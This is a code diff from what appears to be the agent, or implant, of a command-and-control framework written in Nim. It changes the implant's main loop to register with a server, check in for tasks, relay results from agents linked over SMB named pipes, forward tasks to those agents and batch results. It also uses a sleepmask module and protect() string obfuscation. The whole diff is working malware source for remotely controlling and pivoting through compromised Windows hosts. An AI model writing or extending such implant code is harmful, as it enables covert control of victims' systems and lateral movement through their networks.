@@ -1,8 +1,10 @@
-import times, system, random, strformat
+import winim/lean
+import times, system, random, strformat, tables
 import core/[context, sleepmask, exit, transport]
 import utils/io
+import core/transport/smb
 import protocol/[task, result, registration]
-import ../common/[types, utils, crypto]
+import ../common/[types, utils, crypto, serialize]
 
 proc main() = 
     randomize()
@@ -39,7 +41,7 @@ proc main() =
                 var registration: Registration = ctx.collectAgentMetadata()
                 let registrationBytes = ctx.serializeRegistrationData(registration)
 
-                if ctx.sendData(registrationBytes): 
+                if ctx.sendData(@[uint8(1)] & uint32.toBytes(cast[uint32](registrationBytes.len())) & registrationBytes): 
                     print fmt"[+] [{ctx.agentId}] Agent registered."
                     ctx.registered = true
                 else: 
@@ -49,6 +51,12 @@ proc main() =
             let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
             print "\n", fmt"[*] [{date}] Checking in."
 
+            # Check if there are results of linked agents that need to be returned
+            for agentId, hPipe in ctx.links: 
+                let resultBytes = pipeRead(cast[HANDLE](hPipe))
+                if resultBytes.len() > 0:
+                    ctx.sendData(resultBytes)
+
             # Retrieve task queue for the current agent by sending a check-in/heartbeat request
             # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
             let packet: string = ctx.getTasks()
@@ -56,26 +64,25 @@ proc main() =
                 print protect("[*] No tasks to execute.") 
                 continue
 
-            let tasks: seq[Task] = ctx.deserializePacket(packet)
+            let tasks: seq[seq[byte]] = ctx.deserializePacket(packet)
             if tasks.len <= 0: 
                 print protect("[*] No tasks to execute.")
                 continue
 
             # Execute all retrieved tasks and return their output to the server
+            var packer = Packer.init()
+            var numResults: int = 0
+
             for task in tasks: 
-
                 # Forward tasks to linked agents if necessary
-                if Uuid.toString(task.header.agentId) != ctx.agentId: 
-                    discard 
-                    
-                else: 
-                    var result: TaskResult = ctx.handleTask(task)
+                if not ctx.forwardTask(task): 
+                    # Task belongs to the current agent -> execute it and send back the results
+                    var result: TaskResult = ctx.handleTask(ctx.deserializeTask(task))
                     let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
-                    ctx.sendData(resultBytes)
+                    inc numResults
+                    packer.addDataWithLengthPrefix(resultBytes)
 
-            # Check if there are results of linked agents that need to be returned 
-            # for link in ctx.links: 
-            #     discard
+            ctx.sendData(@[uint8(numResults)] & packer.pack())
 
         except CatchableError as err: 
             print protect("[-] "), err.msg
